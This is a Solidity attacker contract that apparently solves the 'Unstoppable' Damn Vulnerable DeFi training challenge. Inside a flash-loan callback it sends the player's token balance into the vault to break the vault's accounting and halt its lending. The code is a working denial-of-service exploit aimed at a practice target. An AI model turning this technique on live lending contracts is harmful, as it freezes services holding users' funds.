// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {UnstoppableVault} from "./UnstoppableVault.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract UnstoppableAttacker is IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;
    DamnValuableToken private immutable token;
    address private immutable player;

    constructor(address _vault) {
        vault = UnstoppableVault(_vault);
        token = DamnValuableToken(address(vault.asset()));
        player = msg.sender;
    }

    function execute() external {
        require(msg.sender == player, "only player");

        uint256 flashAmount = 1;
        uint256 feeAmount = vault.flashFee(address(token), flashAmount);

        require(feeAmount == 0, "fee not zero");

        vault.flashLoan(this, address(token), flashAmount, bytes(""));
    }

    function onFlashLoan(
        address initiator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(initiator == address(this), "invalid initiator");
        require(msg.sender == address(vault), "only vault");

        uint256 playerBalance = token.balanceOf(player);
        token.transferFrom(player, address(vault), playerBalance);

        token.approve(address(vault), type(uint256).max);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
}
